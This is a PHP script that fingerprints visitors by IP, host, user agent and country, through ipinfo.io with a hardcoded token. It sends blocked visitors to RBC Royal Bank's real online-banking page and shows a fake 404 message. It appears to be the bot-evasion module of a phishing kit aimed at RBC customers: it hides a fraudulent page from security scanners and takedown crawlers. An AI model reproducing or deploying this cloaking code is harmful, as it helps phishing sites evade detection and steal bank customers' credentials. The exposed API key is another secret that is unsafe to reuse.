<?php
// Get the visitor's IP address and host
$visitorIP = $_SERVER['REMOTE_ADDR'];
$visitorHost = gethostbyaddr($visitorIP);

// Function to get country code based on IP address
function getCountryCode($ip) {
    $accessKey = '81895f4172954ec39b6d2b90f330c6d4'; // Replace with your IP geolocation API access key
    $url = "http://ipinfo.io/{$ip}/json?token={$accessKey}";
    $response = @file_get_contents($url);
    if ($response === FALSE) {
        return null;
    }
    $details = json_decode($response, true);
    return $details['country'] ?? null;
}

// List of user agent patterns to block
$blockedUserAgents = array(
    // (list of blocked user agents)
);

// Get the user agent
$userAgent = strtolower($_SERVER['HTTP_USER_AGENT']);

// Check if the user agent is in the blocked list
foreach ($blockedUserAgents as $blocked) {
    if (strpos($userAgent, $blocked) !== false) {
        $countryCode = getCountryCode($visitorIP);
        if ($countryCode === 'CA') { // Block if the country is Canada
            header('Location: https://www.rbcroyalbank.com/ways-to-bank/online-banking/index.html');
            echo "<h1>404 Not Found</h1>The page that you have requested could not be found.";
            exit();
        }
    }
}

// List of IP patterns to block
$blockedIPs = array(
    // (list of blocked IP patterns)
);

// Check if the IP is in the blocked list
$ipBlocked = false;
foreach ($blockedIPs as $pattern) {
    if (preg_match('/' . $pattern . '/', $visitorIP)) {
        $ipBlocked = true;
        break;
    }
}

if ($ipBlocked) {
    header('Location: https://www.rbcroyalbank.com/ways-to-bank/online-banking/index.html');
    echo "<h1>404 Not Found</h1>The page that you have requested could not be found.";
    exit();
}
?>
